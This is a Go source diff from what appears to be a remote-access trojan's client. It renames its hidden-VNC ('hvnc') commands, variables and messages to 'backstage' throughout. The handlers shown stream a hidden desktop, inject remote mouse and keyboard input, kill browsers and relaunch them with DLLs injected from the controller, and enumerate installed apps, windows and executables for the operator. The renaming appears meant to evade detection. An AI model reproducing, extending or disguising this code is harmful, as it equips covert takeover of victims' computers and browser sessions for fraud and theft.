@@ -39,24 +39,24 @@ var (
 	voiceSession        *voiceRuntime
 	desktopAudioMu      sync.Mutex
 	desktopAudioSession *voiceRuntime
-	hvncInputOnce       sync.Once
-	hvncInputQueue      chan hvncInputEvent
-	hvncInputDropped    atomic.Uint64
+	backstageInputOnce       sync.Once
+	backstageInputQueue      chan backstageInputEvent
+	backstageInputDropped    atomic.Uint64
 )
 
-type hvncInputKind int
+type backstageInputKind int
 
 const (
-	hvncInputMouseMove hvncInputKind = iota
-	hvncInputMouseDown
-	hvncInputMouseUp
-	hvncInputMouseWheel
-	hvncInputKeyDown
-	hvncInputKeyUp
+	BackstageInputMouseMove backstageInputKind = iota
+	BackstageInputMouseDown
+	BackstageInputMouseUp
+	BackstageInputMouseWheel
+	BackstageInputKeyDown
+	BackstageInputKeyUp
 )
 
-type hvncInputEvent struct {
-	kind    hvncInputKind
+type backstageInputEvent struct {
+	kind    backstageInputKind
 	display int
 	x       int32
 	y       int32
@@ -105,18 +105,18 @@ func resetForReconnect(env *runtime.Env) {
 	env.SelectedDisplay = GetPersistedDisplay()
 	env.DesktopMu.Unlock()
 
-	env.HVNCMu.Lock()
-	if env.HVNCCancel != nil {
-		env.HVNCCancel()
+	env.BackstageMu.Lock()
+	if env.BackstageCancel != nil {
+		env.BackstageCancel()
 	}
-	waitStreamStop(env.HVNCDone, "hvnc")
-	env.HVNCCancel = nil
-	env.HVNCDone = nil
-	env.HVNCMouseControl = false
-	env.HVNCKeyboardControl = false
-	env.HVNCCursorCapture = false
-	env.HVNCSelectedDisplay = 0
-	env.HVNCMu.Unlock()
+	waitStreamStop(env.BackstageDone, "backstage")
+	env.BackstageCancel = nil
+	env.BackstageDone = nil
+	env.BackstageMouseControl = false
+	env.BackstageKeyboardControl = false
+	env.BackstageCursorCapture = false
+	env.BackstageSelectedDisplay = 0
+	env.BackstageMu.Unlock()
 
 	env.WebcamMu.Lock()
 	if env.WebcamCancel != nil {
@@ -184,44 +184,44 @@ func stopVirtualStreamLocked(env *runtime.Env) {
 	env.VirtualDone = nil
 }
 
-func ensureHVNCInputWorker() {
-	hvncInputOnce.Do(func() {
-		hvncInputQueue = make(chan hvncInputEvent, 1024)
-		goSafe("hvnc input worker", nil, func() {
-			for ev := range hvncInputQueue {
+func ensurebackstageInputWorker() {
+	backstageInputOnce.Do(func() {
+		backstageInputQueue = make(chan backstageInputEvent, 1024)
+		goSafe("backstage input worker", nil, func() {
+			for ev := range backstageInputQueue {
 				switch ev.kind {
-				case hvncInputMouseMove:
-					if err := capture.HVNCInputMouseMove(ev.display, ev.x, ev.y); err != nil {
-						log.Printf("hvnc input worker: mouse_move failed: %v", err)
+				case BackstageInputMouseMove:
+					if err := capture.BackstageInputMouseMove(ev.display, ev.x, ev.y); err != nil {
+						log.Printf("backstage input worker: mouse_move failed: %v", err)
 					}
-				case hvncInputMouseDown:
+				case BackstageInputMouseDown:
 					if ev.x != 0 || ev.y != 0 {
-						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+						_ = capture.BackstageInputMouseMove(ev.display, ev.x, ev.y)
 					}
-					if err := capture.HVNCInputMouseDown(ev.button); err != nil {
-						log.Printf("hvnc input worker: mouse_down failed: %v", err)
+					if err := capture.BackstageInputMouseDown(ev.button); err != nil {
+						log.Printf("backstage input worker: mouse_down failed: %v", err)
 					}
-				case hvncInputMouseUp:
+				case BackstageInputMouseUp:
 					if ev.x != 0 || ev.y != 0 {
-						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+						_ = capture.BackstageInputMouseMove(ev.display, ev.x, ev.y)
 					}
-					if err := capture.HVNCInputMouseUp(ev.button); err != nil {
-						log.Printf("hvnc input worker: mouse_up failed: %v", err)
+					if err := capture.BackstageInputMouseUp(ev.button); err != nil {
+						log.Printf("backstage input worker: mouse_up failed: %v", err)
 					}
-				case hvncInputMouseWheel:
+				case BackstageInputMouseWheel:
 					if ev.x != 0 || ev.y != 0 {
-						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+						_ = capture.BackstageInputMouseMove(ev.display, ev.x, ev.y)
 					}
-					if err := capture.HVNCInputMouseWheel(ev.delta); err != nil {
-						log.Printf("hvnc input worker: mouse_wheel failed: %v", err)
+					if err := capture.BackstageInputMouseWheel(ev.delta); err != nil {
+						log.Printf("backstage input worker: mouse_wheel failed: %v", err)
 					}
-				case hvncInputKeyDown:
-					if err := capture.HVNCInputKeyDown(ev.vk); err != nil {
-						log.Printf("hvnc input worker: key_down vk=%d failed: %v", ev.vk, err)
+				case BackstageInputKeyDown:
+					if err := capture.BackstageInputKeyDown(ev.vk); err != nil {
+						log.Printf("backstage input worker: key_down vk=%d failed: %v", ev.vk, err)
 					}
-				case hvncInputKeyUp:
-					if err := capture.HVNCInputKeyUp(ev.vk); err != nil {
-						log.Printf("hvnc input worker: key_up vk=%d failed: %v", ev.vk, err)
+				case BackstageInputKeyUp:
+					if err := capture.BackstageInputKeyUp(ev.vk); err != nil {
+						log.Printf("backstage input worker: key_up vk=%d failed: %v", ev.vk, err)
 					}
 				}
 			}
@@ -229,36 +229,36 @@ func ensureHVNCInputWorker() {
 	})
 }
 
-func enqueueHVNCInput(ev hvncInputEvent) {
-	ensureHVNCInputWorker()
+func enqueuebackstageInput(ev backstageInputEvent) {
+	ensurebackstageInputWorker()
 	select {
-	case hvncInputQueue <- ev:
+	case backstageInputQueue <- ev:
 		return
 	default:
-		if ev.kind == hvncInputMouseMove {
-			dropped := hvncInputDropped.Add(1)
+		if ev.kind == BackstageInputMouseMove {
+			dropped := backstageInputDropped.Add(1)
 			if dropped%100 == 1 {
-				log.Printf("hvnc input queue: dropping mouse_move events dropped=%d", dropped)
+				log.Printf("backstage input queue: dropping mouse_move events dropped=%d", dropped)
 			}
 			return
 		}
 		t := time.NewTimer(200 * time.Millisecond)
 		defer t.Stop()
 		select {
-		case hvncInputQueue <- ev:
+		case backstageInputQueue <- ev:
 		case <-t.C:
-			log.Printf("hvnc input queue: enqueue timeout kind=%d", ev.kind)
+			log.Printf("backstage input queue: enqueue timeout kind=%d", ev.kind)
 		}
 	}
 }
 
-func clearHVNCInputQueue() {
-	if hvncInputQueue == nil {
+func clearbackstageInputQueue() {
+	if backstageInputQueue == nil {
 		return
 	}
 	for {
 		select {
-		case <-hvncInputQueue:
+		case <-backstageInputQueue:
 		default:
 			return
 		}
@@ -1068,8 +1068,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultAsync(env, cmdID)
 		return nil
 
-	// ==================== HVNC COMMANDS ====================
-	case "hvnc_start":
+	// ==================== backstage COMMANDS ====================
+	case "backstage_start":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		autoStartExplorer := false
 		VirtualMode := false
@@ -1110,24 +1110,24 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
-		env.HVNCMu.Lock()
-		if env.HVNCCancel != nil {
-			env.HVNCCancel()
-			waitStreamStop(env.HVNCDone, "hvnc")
+		env.BackstageMu.Lock()
+		if env.BackstageCancel != nil {
+			env.BackstageCancel()
+			waitStreamStop(env.BackstageDone, "backstage")
 		}
-		hvncCtx, cancel := context.WithCancel(ctx)
-		env.HVNCCancel = cancel
+		backstageCtx, cancel := context.WithCancel(ctx)
+		env.BackstageCancel = cancel
 		done := make(chan struct{})
-		env.HVNCDone = done
-		goSafe("hvnc stream", env.Cancel, func() {
-			log.Printf("hvnc: start requested (autoStartExplorer=%v)", autoStartExplorer)
-			_ = HVNCStart(hvncCtx, env, autoStartExplorer)
+		env.BackstageDone = done
+		goSafe("backstage stream", env.Cancel, func() {
+			log.Printf("backstage: start requested (autoStartExplorer=%v)", autoStartExplorer)
+			_ = backstageStart(backstageCtx, env, autoStartExplorer)
 			close(done)
 		})
-		env.HVNCMu.Unlock()
+		env.BackstageMu.Unlock()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_stop":
+	case "backstage_stop":
 		env.VirtualMu.Lock()
 		if env.VirtualCancel != nil {
 			log.Printf("hidden: stop requested")
@@ -1137,22 +1137,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return nil
 		}
 		env.VirtualMu.Unlock()
-		env.HVNCMu.Lock()
-		log.Printf("hvnc: stop requested")
-		env.HVNCMouseControl = false
-		env.HVNCKeyboardControl = false
-		env.HVNCCursorCapture = false
-		clearHVNCInputQueue()
-		if env.HVNCCancel != nil {
-			env.HVNCCancel()
+		env.BackstageMu.Lock()
+		log.Printf("backstage: stop requested")
+		env.BackstageMouseControl = false
+		env.BackstageKeyboardControl = false
+		env.BackstageCursorCapture = false
+		clearbackstageInputQueue()
+		if env.BackstageCancel != nil {
+			env.BackstageCancel()
 		}
-		waitStreamStop(env.HVNCDone, "hvnc")
-		env.HVNCCancel = nil
-		env.HVNCDone = nil
-		env.HVNCMu.Unlock()
+		waitStreamStop(env.BackstageDone, "backstage")
+		env.BackstageCancel = nil
+		env.BackstageDone = nil
+		env.BackstageMu.Unlock()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_select_display":
+	case "backstage_select_display":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		disp := 0
 		if payload != nil {
@@ -1173,11 +1173,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				disp = int(v)
 			}
 		}
-		log.Printf("hvnc: select display %d", disp)
-		_ = HVNCSelect(ctx, env, disp)
+		log.Printf("backstage: select display %d", disp)
+		_ = backstageSelect(ctx, env, disp)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_enable_mouse":
+	case "backstage_enable_mouse":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		enabled := true
 		if payload != nil {
@@ -1191,11 +1191,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
-		log.Printf("hvnc: mouse control %v", enabled)
-		_ = HVNCMouseControl(ctx, env, enabled)
+		log.Printf("backstage: mouse control %v", enabled)
+		_ = backstageMouseControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_enable_keyboard":
+	case "backstage_enable_keyboard":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		enabled := true
 		if payload != nil {
@@ -1209,11 +1209,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
-		log.Printf("hvnc: keyboard control %v", enabled)
-		_ = HVNCKeyboardControl(ctx, env, enabled)
+		log.Printf("backstage: keyboard control %v", enabled)
+		_ = backstageKeyboardControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_enable_cursor":
+	case "backstage_enable_cursor":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		enabled := false
 		if payload != nil {
@@ -1227,11 +1227,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
-		log.Printf("hvnc: cursor capture %v", enabled)
-		_ = HVNCCursorControl(ctx, env, enabled)
+		log.Printf("backstage: cursor capture %v", enabled)
+		_ = backstageCursorControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_enable_dxgi":
+	case "backstage_enable_dxgi":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		dxgiEnabled := true
 		if payload != nil {
@@ -1239,11 +1239,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				dxgiEnabled = v
 			}
 		}
-		log.Printf("hvnc: DXGI capture %v", dxgiEnabled)
-		capture.SetHVNCDXGIEnabled(dxgiEnabled)
+		log.Printf("backstage: DXGI capture %v", dxgiEnabled)
+		capture.SetbackstageDXGIEnabled(dxgiEnabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_enable_uia":
+	case "backstage_enable_uia":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		uiaEnabled := true
 		if payload != nil {
@@ -1251,11 +1251,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				uiaEnabled = v
 			}
 		}
-		log.Printf("hvnc: UIA support %v", uiaEnabled)
-		capture.SetHVNCUIAEnabled(uiaEnabled)
+		log.Printf("backstage: UIA support %v", uiaEnabled)
+		capture.SetbackstageUIAEnabled(uiaEnabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_set_resolution":
+	case "backstage_set_resolution":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		maxH := 1080
 		if payload != nil {
@@ -1263,11 +1263,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				maxH = v
 			}
 		}
-		log.Printf("hvnc: set resolution maxHeight=%d", maxH)
+		log.Printf("backstage: set resolution maxHeight=%d", maxH)
 		capture.SetMaxResolution(maxH)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_set_fps":
+	case "backstage_set_fps":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		fps := 120
 		if payload != nil {
@@ -1279,14 +1279,14 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			fps = SetVirtualTargetFPS(fps)
 		} else {
 			// Also seed virtual mode so a setting sent immediately before
-			// hvnc_start is retained when that start selects virtual mode.
-			fps = SetHVNCTargetFPS(fps)
+			// backstage_start is retained when that start selects virtual mode.
+			fps = SetbackstageTargetFPS(fps)
 			SetVirtualTargetFPS(fps)
 		}
-		log.Printf("hvnc: set target fps=%d", fps)
+		log.Printf("backstage: set target fps=%d", fps)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_set_quality":
+	case "backstage_set_quality":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		quality := 90
 		codec := ""
@@ -1298,16 +1298,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				codec = v
 			}
 		}
-		log.Printf("hvnc: set quality=%d codec=%s", quality, codec)
+		log.Printf("backstage: set quality=%d codec=%s", quality, codec)
 		capture.SetQualityAndCodec(quality, codec)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_request_keyframe":
-		log.Printf("hvnc: request full frame")
-		capture.RequestHVNCFullFrame()
+	case "backstage_request_keyframe":
+		log.Printf("backstage: request full frame")
+		capture.RequestbackstageFullFrame()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
-	case "hvnc_mouse_move":
+	case "backstage_mouse_move":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		x, y := int32(0), int32(0)
 		if payload != nil {
@@ -1372,14 +1372,14 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			capture.VirtualInputMouseMove(x, y)
 			return nil
 		}
-		if !env.HVNCMouseControl {
+		if !env.BackstageMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
-		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseMove, display: env.HVNCSelectedDisplay, x: x, y: y})
+		enqueuebackstageInput(backstageInputEvent{kind: BackstageInputMouseMove, display: env.BackstageSelectedDisplay, x: x, y: y})
 		return nil
-	case "hvnc_mouse_down":
-		if env.VirtualCancel == nil && !env.HVNCMouseControl {
+	case "backstage_mouse_down":
+		if env.VirtualCancel == nil && !env.BackstageMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1475,10 +1475,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			_ = capture.VirtualInputMouseDown(btn)
 			return nil
 		}
-		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseDown, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
+		enqueuebackstageInput(backstageInputEvent{kind: BackstageInputMouseDown, display: env.BackstageSelectedDisplay, button: btn, x: x, y: y})
 		return nil
-	case "hvnc_mouse_up":
-		if env.VirtualCancel == nil && !env.HVNCMouseControl {
+	case "backstage_mouse_up":
+		if env.VirtualCancel == nil && !env.BackstageMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1574,10 +1574,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			_ = capture.VirtualInputMouseUp(btn)
 			return nil
 		}
-		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseUp, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
+		enqueuebackstageInput(backstageInputEvent{kind: BackstageInputMouseUp, display: env.BackstageSelectedDisplay, button: btn, x: x, y: y})
 		return nil
-	case "hvnc_mouse_wheel":
-		if env.VirtualCancel == nil && !env.HVNCMouseControl {
+	case "backstage_mouse_wheel":
+		if env.VirtualCancel == nil && !env.BackstageMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1673,10 +1673,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			_ = capture.VirtualInputMouseWheel(delta)
 			return nil
 		}
-		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseWheel, display: env.HVNCSelectedDisplay, delta: delta, x: x, y: y})
+		enqueuebackstageInput(backstageInputEvent{kind: BackstageInputMouseWheel, display: env.BackstageSelectedDisplay, delta: delta, x: x, y: y})
 		return nil
-	case "hvnc_key_down":
-		if env.VirtualCancel == nil && !env.HVNCKeyboardControl {
+	case "backstage_key_down":
+		if env.VirtualCancel == nil && !env.BackstageKeyboardControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1687,7 +1687,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				code = v
 			}
 		}
-		if vk := keyCodeToVKHVNC(code); vk != 0 {
+		if vk := keyCodeToVKbackstage(code); vk != 0 {
 			if env.VirtualCancel != nil {
 				if !env.VirtualKeyboardControl {
 					sendCommandResultSafe(env, cmdID, true, "")
@@ -1696,11 +1696,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				capture.VirtualInputKeyDown(vk)
 				return nil
 			}
-			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
+			enqueuebackstageInput(backstageInputEvent{kind: BackstageInputKeyDown, vk: vk})
 		}
 		return nil
-	case "hvnc_key_up":
-		if env.VirtualCancel == nil && !env.HVNCKeyboardControl {
+	case "backstage_key_up":
+		if env.VirtualCancel == nil && !env.BackstageKeyboardControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1711,7 +1711,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				code = v
 			}
 		}
-		if vk := keyCodeToVKHVNC(code); vk != 0 {
+		if vk := keyCodeToVKbackstage(code); vk != 0 {
 			if env.VirtualCancel != nil {
 				if !env.VirtualKeyboardControl {
 					sendCommandResultSafe(env, cmdID, true, "")
@@ -1720,10 +1720,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				capture.VirtualInputKeyUp(vk)
 				return nil
 			}
-			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
+			enqueuebackstageInput(backstageInputEvent{kind: BackstageInputKeyUp, vk: vk})
 		}
 		return nil
-	case "hvnc_start_process":
+	case "backstage_start_process":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		filePath := ""
 		killExe := ""
@@ -1757,12 +1757,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			})
 			return nil
 		}
-		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v display=%d)", filePath, killExe, operaPatch, display)
+		log.Printf("backstage: start process %q (kill_exe=%q opera_patch=%v display=%d)", filePath, killExe, operaPatch, display)
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_start_process", nil, func() {
+		goSafe("backstage_start_process", nil, func() {
 			sendLaunchStatus := func(step string, success bool, detail string) {
-				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserLaunchStatus{
-					Type:    "hvnc_browser_launch_status",
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageBrowserLaunchStatus{
+					Type:    "backstage_browser_launch_status",
 					Browser: filepath.Base(strings.Trim(filePath, `"`)),
 					Step:    step,
 					Success: success,
@@ -1772,14 +1772,14 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if killExe != "" {
 				sendLaunchStatus("kill", true, "killing "+killExe)
 				out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
-				log.Printf("hvnc: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
+				log.Printf("backstage: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
 				if err != nil {
 					sendLaunchStatus("kill", false, fmt.Sprintf("taskkill failed: %s", strings.TrimSpace(string(out))))
 				}
 			}
 			sendLaunchStatus("launch", true, fmt.Sprintf("starting %s", filePath))
-			if err := capture.StartHVNCProcess(filePath, operaPatch, display); err != nil {
-				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
+			if err := capture.StartbackstageProcess(filePath, operaPatch, display); err != nil {
+				log.Printf("backstage: start process failed for %q: %v", filePath, err)
 				sendLaunchStatus("launch", false, fmt.Sprintf("failed: %v", err))
 			} else {
 				sendLaunchStatus("launch", true, "process created")
@@ -1787,7 +1787,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		})
 		return nil
 
-	case "hvnc_kill_all":
+	case "backstage_kill_all":
 		if env.VirtualCancel != nil {
 			log.Printf("hidden: kill all processes on virtual monitor")
 			sendCommandResultSafe(env, cmdID, true, "")
@@ -1798,23 +1798,23 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			})
 			return nil
 		}
-		log.Printf("hvnc: kill all processes on hidden desktop")
+		log.Printf("backstage: kill all processes on hidden desktop")
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_kill_all", nil, func() {
-			if err := capture.HVNCKillAll(); err != nil {
-				log.Printf("hvnc: kill all failed: %v", err)
+		goSafe("backstage_kill_all", nil, func() {
+			if err := capture.BackstageKillAll(); err != nil {
+				log.Printf("backstage: kill all failed: %v", err)
 			}
 		})
 		return nil
 
-	case "hvnc_window_list":
-		log.Printf("hvnc: window list requested")
+	case "backstage_window_list":
+		log.Printf("backstage: window list requested")
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_window_list", nil, func() {
-			windows, monitors := capture.HVNCEnumWindows()
-			winEntries := make([]wire.HVNCWindowEntry, 0, len(windows))
+		goSafe("backstage_window_list", nil, func() {
+			windows, monitors := capture.BackstageEnumWindows()
+			winEntries := make([]wire.BackstageWindowEntry, 0, len(windows))
 			for _, w := range windows {
-				winEntries = append(winEntries, wire.HVNCWindowEntry{
+				winEntries = append(winEntries, wire.BackstageWindowEntry{
 					Title:       w.Title,
 					X:           w.X,
 					Y:           w.Y,
@@ -1825,9 +1825,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Monitor:     w.Monitor,
 				})
 			}
-			monEntries := make([]wire.HVNCMonitorEntry, 0, len(monitors))
+			monEntries := make([]wire.BackstageMonitorEntry, 0, len(monitors))
 			for _, m := range monitors {
-				monEntries = append(monEntries, wire.HVNCMonitorEntry{
+				monEntries = append(monEntries, wire.BackstageMonitorEntry{
 					Index:   m.Index,
 					Name:    m.Name,
 					X:       m.X,
@@ -1837,63 +1837,63 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Primary: m.Primary,
 				})
 			}
-			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCWindowListResult{
-				Type:     "hvnc_window_list_result",
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageWindowListResult{
+				Type:     "backstage_window_list_result",
 				Windows:  winEntries,
 				Monitors: monEntries,
 			})
-			log.Printf("hvnc: window list sent: %d windows, %d monitors", len(winEntries), len(monEntries))
+			log.Printf("backstage: window list sent: %d windows, %d monitors", len(winEntries), len(monEntries))
 		})
 		return nil
 
-	case "hvnc_browser_check":
-		log.Printf("hvnc: browser availability check requested")
+	case "backstage_browser_check":
+		log.Printf("backstage: browser availability check requested")
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_browser_check", nil, func() {
+		goSafe("backstage_browser_check", nil, func() {
 			browsers := capture.CheckInstalledBrowsers()
-			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserCheckResult{
-				Type:     "hvnc_browser_check_result",
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageBrowserCheckResult{
+				Type:     "backstage_browser_check_result",
 				Browsers: browsers,
 			})
-			log.Printf("hvnc: browser check complete: %v", browsers)
+			log.Printf("backstage: browser check complete: %v", browsers)
 		})
 		return nil
 
-	case "hvnc_installed_apps":
-		log.Printf("hvnc: installed apps enumeration requested")
+	case "backstage_installed_apps":
+		log.Printf("backstage: installed apps enumeration requested")
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_installed_apps", nil, func() {
+		goSafe("backstage_installed_apps", nil, func() {
 			const batchSize = 15
 			apps := enumerateInstalledApps()
-			log.Printf("hvnc: enumerated %d installed apps, extracting icons in batches", len(apps))
-			var batch []wire.HVNCInstalledApp
+			log.Printf("backstage: enumerated %d installed apps, extracting icons in batches", len(apps))
+			var batch []wire.BackstageInstalledApp
 			sent := 0
 			for _, a := range apps {
-				batch = append(batch, wire.HVNCInstalledApp{
+				batch = append(batch, wire.BackstageInstalledApp{
 					Name:    a.name,
 					ExePath: a.exePath,
 					Icon:    extractIconBase64(a.exePath),
 				})
 				if len(batch) >= batchSize {
-					_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCInstalledAppsResult{
-						Type: "hvnc_installed_apps_result",
+					_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageInstalledAppsResult{
+						Type: "backstage_installed_apps_result",
 						Apps: batch,
 					})
 					sent += len(batch)
 					batch = batch[:0]
 				}
 			}
-			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCInstalledAppsResult{
-				Type: "hvnc_installed_apps_result",
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageInstalledAppsResult{
+				Type: "backstage_installed_apps_result",
 				Apps: batch,
 				Done: true,
 			})
 			sent += len(batch)
-			log.Printf("hvnc: installed apps complete, sent %d apps", sent)
+			log.Printf("backstage: installed apps complete, sent %d apps", sent)
 		})
 		return nil
 
-	case "hvnc_lookup":
+	case "backstage_lookup":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		exeName := ""
 		if payload != nil {
@@ -1905,28 +1905,28 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no exe name provided")
 			return nil
 		}
-		log.Printf("hvnc: lookup exe %q", exeName)
+		log.Printf("backstage: lookup exe %q", exeName)
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_lookup", nil, func() {
+		goSafe("backstage_lookup", nil, func() {
 			filesearch.LookupExe(exeName, 8, func(path string) {
-				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
-					Type: "hvnc_lookup_result",
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageLookupResult{
+					Type: "backstage_lookup_result",
 					Exe:  exeName,
 					Path: path,
 					Done: false,
 				})
 			})
-			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
-				Type: "hvnc_lookup_result",
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageLookupResult{
+				Type: "backstage_lookup_result",
 				Exe:  exeName,
 				Path: "",
 				Done: true,
 			})
-			log.Printf("hvnc: lookup complete for %q", exeName)
+			log.Printf("backstage: lookup complete for %q", exeName)
 		})
 		return nil
 
-	case "hvnc_start_process_injected":
+	case "backstage_start_process_injected":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		filePath := ""
 		searchPath := ""
@@ -1952,16 +1952,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return nil
 		}
 		captureDllBytes := extractCaptureDLLBytes(payload)
-		log.Printf("hvnc: start process injected %q search=%q replace=%q display=%d dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, display, len(dllBytes), len(captureDllBytes))
+		log.Printf("backstage: start process injected %q search=%q replace=%q display=%d dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, display, len(dllBytes), len(captureDllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_start_process_injected", nil, func() {
-			if _, err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath, display); err != nil {
-				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
+		goSafe("backstage_start_process_injected", nil, func() {
+			if _, err := capture.StartbackstageProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath, display); err != nil {
+				log.Printf("backstage: injected process failed for %q: %v", filePath, err)
 			}
 		})
 		return nil
 
-	case "hvnc_start_chrome_injected":
+	case "backstage_start_chrome_injected":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		chromePath := ""
 		if payload != nil {
@@ -1974,17 +1974,17 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
 			return nil
 		}
